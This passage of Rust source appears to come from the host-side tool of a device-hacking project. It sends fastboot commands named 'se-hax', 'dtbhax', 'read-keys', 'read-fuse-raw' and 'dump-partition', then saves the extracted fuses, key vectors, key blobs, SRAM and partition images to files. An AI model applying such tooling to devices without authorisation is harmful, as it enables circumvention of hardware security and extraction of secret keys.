                .map_err(CommandError::MissingDevice)?;

            let command_response = device
                .send_command(&format!("read-fuse-raw:{offset:08X}"))
                .map_err(CommandError::Device)?;

            match command_response {
                fastboot::SendCommandResponse::Fail(why) => return Err(CommandError::Fail(why)),
                fastboot::SendCommandResponse::Ok(_) => {
                    tracing::debug!("Device sent an OKAY response to a fuse command");
                    return Err(CommandError::InvalidResponse);
                }
                fastboot::SendCommandResponse::Data(amt) => {
                    let mut buffer = vec![0u8; amt as usize];
                    device
                        .read_data(&mut buffer)
                        .map_err(CommandError::Device)?;
                    print!("Value: ");
                    for byte in buffer {
                        print!("{byte:02X}");
                    }
                    println!();
                }
            }

            _ = device.read_response_full().map_err(CommandError::Device)?;
        }
        args::Command::SeHax {
            validate,
            vectors,
            test,
        } => {
            let device = find_chosen_device(devices, args.serial.as_deref())
                .map_err(CommandError::MissingDevice)?;

            if validate {
                let command_response = device
                    .send_command("se-hax-validate")
                    .map_err(CommandError::Device)?;

                match command_response {
                    fastboot::SendCommandResponse::Fail(why) => {
                        return Err(CommandError::Fail(why));
                    }
                    fastboot::SendCommandResponse::Ok(_) => {
                        tracing::debug!(
                            "Device sent an OKAY response to a validate-se-hax command"
                        );
                        return Err(CommandError::InvalidResponse);
                    }
                    fastboot::SendCommandResponse::Data(_) => {
                        tracing::debug!("Device sent a DATA response to a validate-se-hax command");
                        return Err(CommandError::InvalidResponse);
                    }
                }
            } else if vectors {
                device
                    .send_data(b"se-hax-vectors")
                    .map_err(CommandError::Device)?;

                #[derive(Debug, Default, Clone, Copy, PartialEq, Eq)]
                struct KeyVectorSet {
                    //     // pub data: [u8; 16],
                    //     // pub iv: [u8; 16],
                    pub vector_empty: [u8; 16],
                    pub vector_0: [u8; 16],
                    pub vector_01: [u8; 16],
                    pub vector_012: [u8; 16],
                    pub vector_0123: [u8; 16],
                }

                let mut out = Vec::new();

                // for _ in 0..3 {
                loop {
                    match device.read_response_full().map_err(CommandError::Device)? {
                        fastboot::SendCommandResponse::Fail(why) => {
                            return Err(CommandError::Fail(why));
                        }
                        fastboot::SendCommandResponse::Ok(_) => {
                            break;
                        }
                        fastboot::SendCommandResponse::Data(amt) => {
                            assert_eq!(amt, 0x60);
                            let mut buffer = vec![0u8; amt as usize];
                            device
                                .read_data(&mut buffer)
                                .map_err(CommandError::Device)?;

                            out.push(KeyVectorSet {
                                vector_empty: buffer[0x10..0x20].try_into().unwrap(),
                                vector_0: buffer[0x20..0x30].try_into().unwrap(),
                                vector_01: buffer[0x30..0x40].try_into().unwrap(),
                                vector_012: buffer[0x40..0x50].try_into().unwrap(),
                                vector_0123: buffer[0x50..0x60].try_into().unwrap(),
                            });

                            // for chunk in buffer.chunks(0x10) {
                            //     print!("Response: ");
                            //     for byte in chunk {
                            //         print!("{byte:02X}");
                            //     }

                            //     println!(
                            //         " [{}]",
                            //         chunk
                            //             .into_iter()
                            //             .map(|byte| std::borrow::Cow::Owned(format!("{byte:#04X}")))
                            //             .intersperse(std::borrow::Cow::Borrowed(", "))
                            //             .collect::<String>()
                            //     );
                            // }
                        }
                    }
                }

                fn format_array(item: &[u8; 0x10]) -> String {
                    item.into_iter()
                        .map(|byte| std::borrow::Cow::Owned(format!("{byte:#04X}")))
                        .intersperse(std::borrow::Cow::Borrowed(", "))
                        .collect::<String>()
                }
                fn format_hexstr(item: &[u8; 0x10]) -> String {
                    item.into_iter()
                        .map(|byte| std::borrow::Cow::Owned(format!("{byte:02X}")))
                        .collect::<String>()
                }
                for (idx, vector) in out.iter().enumerate() {
                    println!(
                        "Vector {idx} {{\n\tvector_empty: [{}], // {}\n\tvector_0: [{}], // {}\n\tvector_01: [{}], // {}\n\tvector_012: [{}], // {}\n\tvector_0123: [{}], // {}\n}}",
                        format_array(&vector.vector_empty),
                        format_hexstr(&vector.vector_empty),
                        format_array(&vector.vector_0),
                        format_hexstr(&vector.vector_0),
                        format_array(&vector.vector_01),
                        format_hexstr(&vector.vector_01),
                        format_array(&vector.vector_012),
                        format_hexstr(&vector.vector_012),
                        format_array(&vector.vector_0123),
                        format_hexstr(&vector.vector_0123),
                    );
                }

                println!("Out: {out:#?}");
            } else if test {
                let command_response = device
                    .send_command("se-hax-test")
                    .map_err(CommandError::Device)?;

                match command_response {
                    fastboot::SendCommandResponse::Fail(why) => {
                        return Err(CommandError::Fail(why));
                    }
                    fastboot::SendCommandResponse::Ok(_) => {
                        tracing::debug!("Device sent an OKAY response to a se-hax-test command");
                        return Err(CommandError::InvalidResponse);
                    }
                    fastboot::SendCommandResponse::Data(amt) => {
                        let mut buffer = vec![0u8; amt as usize];
                        device
                            .read_data(&mut buffer)
                            .map_err(CommandError::Device)?;
                        print!("Response: ");
                        for byte in buffer {
                            print!("{byte:02X}");
                        }
                        println!();
                    }
                }

                _ = device.read_response_full().map_err(CommandError::Device)?;
            } else {
                device.send_data(b"se-hax").map_err(CommandError::Device)?;
                for offset in 0..4 {
                    let start = std::time::Instant::now();
                    match device
                        .read_response_full_no_timeout()
                        .map_err(CommandError::Device)?
                    {
                        fastboot::SendCommandResponse::Fail(why) => {
                            return Err(CommandError::Fail(why));
                        }
                        fastboot::SendCommandResponse::Ok(_) => {
                            tracing::debug!("Device sent an OKAY response to a se-hax command");
                            return Err(CommandError::InvalidResponse);
                        }
                        fastboot::SendCommandResponse::Data(amt) => {
                            let mut buffer = vec![0u8; amt as usize];
                            device
                                .read_data(&mut buffer)
                                .map_err(CommandError::Device)?;
                            print!(
                                "Response (idx {offset}) in {:.2}s: ",
                                start.elapsed().as_secs_f64()
                            );
                            for byte in buffer {
                                print!("{byte:02X}");
                            }
                            println!();
                        }
                    }
                }

                _ = device.read_response_full().map_err(CommandError::Device)?;
            }
        }
        args::Command::ReadKeys => {
            let device = find_chosen_device(devices, args.serial.as_deref())
                .map_err(CommandError::MissingDevice)?;

            let response = device
                .send_command("read-keys")
                .map_err(CommandError::Device)?;

            match response {
                fastboot::SendCommandResponse::Fail(why) => {
                    return Err(CommandError::Fail(why));
                }
                fastboot::SendCommandResponse::Ok(_) => {
                    tracing::debug!("Device sent an OKAY response to read-keys?");
                    return Err(CommandError::InvalidResponse);
                }
                fastboot::SendCommandResponse::Data(amount) => {
                    let mut data = vec![0u8; amount as usize];
                    println!("Reading keys! ({amount} bytes)...");
                    device.read_data(&mut data).map_err(CommandError::Device)?;
                    let seconds = std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_secs();
                    let file_name = format!("./keys_{seconds}.bin");
                    println!("Read keys! Saving it to {file_name}");
                    std::fs::write(file_name, data).unwrap();
                }
            }
        }
        args::Command::Partitions { qspi } => {
            let device = find_chosen_device(devices, args.serial.as_deref())
                .map_err(CommandError::MissingDevice)?;

            let command = match qspi {
                true => "partitions:qspi",
                false => "partitions:ufs",
            };

            let response = device.send_command(command).map_err(CommandError::Device)?;

            match response {
                fastboot::SendCommandResponse::Fail(why) => {
                    return Err(CommandError::Fail(why));
                }
                fastboot::SendCommandResponse::Ok(_) => {}
                fastboot::SendCommandResponse::Data(_) => {
                    tracing::debug!("Device sent an DATA response to partitions?");
                    return Err(CommandError::InvalidResponse);
                }
            }
        }
        args::Command::DumpPartition {
            qspi,
            partition,
            out_dir,
        } => {
            let device = find_chosen_device(devices, args.serial.as_deref())
                .map_err(CommandError::MissingDevice)?;

            let source = match qspi {
                true => "qspi",
                false => "ufs",
            };

            let command = format!("dump-partition:{source}:{partition}");

            let seconds = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs();
            let file_name = format!("partition-{partition}-{seconds}.bin");
            let file_path = match out_dir {
                Some(mut path) => {
                    path.push(file_name);
                    path
                }
                None => std::path::PathBuf::from(format!("./{file_name}")),
            };
            let mut file = std::fs::File::create_new(&file_path).unwrap();

            let (tx, rx) = std::sync::mpsc::channel::<Vec<u8>>();
            let jh = std::thread::spawn(move || loop {
                let Ok(buffer) = rx.recv() else {
                    file.flush().unwrap();
                    return;
                };

                file.write_all(&buffer[..]).unwrap();
            });

            let mut response = device
                .send_command(&command)
                .map_err(CommandError::Device)?;
            let mut itered = false;
            loop {
                match response {
                    fastboot::SendCommandResponse::Fail(why) => {
                        return Err(CommandError::Fail(why));
                    }
                    fastboot::SendCommandResponse::Ok(_) => {
                        if !itered {
                            tracing::debug!("Device sent an OKAY response to dump?");
                            return Err(CommandError::InvalidResponse);
                        }

                        drop(tx);
                        jh.join().unwrap();
                        println!("Read partition! Saved it to {}", file_path.display());
                        break;
                    }
                    fastboot::SendCommandResponse::Data(amount) => {
                        itered = true;
                        let mut data = vec![0u8; amount as usize];
                        println!("Reading partition '{partition}' ({amount} bytes)...");
                        let pb = ProgressBar::new(amount as u64);
                        pb.set_style(
                            ProgressStyle::with_template(
                                "[{elapsed_precise}] [{wide_bar}] {bytes}/{total_bytes} ({eta})",
                            )
                            .unwrap()
                            .with_key(
                                "eta",
                                |state: &ProgressState, w: &mut dyn std::fmt::Write| {
                                    write!(w, "{:.1}s", state.eta().as_secs_f64()).unwrap()
                                },
                            )
                            .progress_chars("#>-"),
                        );
                        let mut amt_read = 0u64;
                        for chunk in data.chunks_mut(64 * 1024) {
                            device.read_data(chunk).map_err(CommandError::Device)?;
                            amt_read += chunk.len() as u64;
                            pb.set_position(amt_read);
                        }
                        pb.finish();
                        tx.send(data).unwrap();
                    }
                }
                response = device.read_response_full().map_err(CommandError::Device)?;
            }
        }
        args::Command::ReadSysram => {
            let device = find_chosen_device(devices, args.serial.as_deref())
                .map_err(CommandError::MissingDevice)?;

            let response = device
                .send_command("read-sysram")
                .map_err(CommandError::Device)?;
            match response {
                fastboot::SendCommandResponse::Fail(why) => {
                    return Err(CommandError::Fail(why));
                }
                fastboot::SendCommandResponse::Ok(_) => {
                    tracing::debug!("Device sent an OKAY response to read-sysram?");
                    return Err(CommandError::InvalidResponse);
                }
                fastboot::SendCommandResponse::Data(amount) => {
                    let mut bytes = vec![0u8; amount as usize];
                    device.read_data(&mut bytes).map_err(CommandError::Device)?;
                    let seconds = std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_secs();
                    let file_name = format!("./sysram_{seconds}.bin");
                    println!("Read sysram! Saving it to {file_name}");
                    std::fs::write(file_name, bytes).unwrap();
                }
            }

            let _response = device.read_response_full().map_err(CommandError::Device)?;
        }
        args::Command::Dtbhax => {
            let device = find_chosen_device(devices, args.serial.as_deref())
                .map_err(CommandError::MissingDevice)?;

            let response = device
                .send_command("dtbhax:setup")
                .map_err(CommandError::Device)?;
            match response {
                fastboot::SendCommandResponse::Fail(why) => {
                    return Err(CommandError::Fail(why));
                }
                fastboot::SendCommandResponse::Ok(_) => {}
                fastboot::SendCommandResponse::Data(_) => {
                    tracing::debug!("Device sent an DATA response to dtbhax?");
                    return Err(CommandError::InvalidResponse);
                }
            }
        }
    }

    Ok(())
}
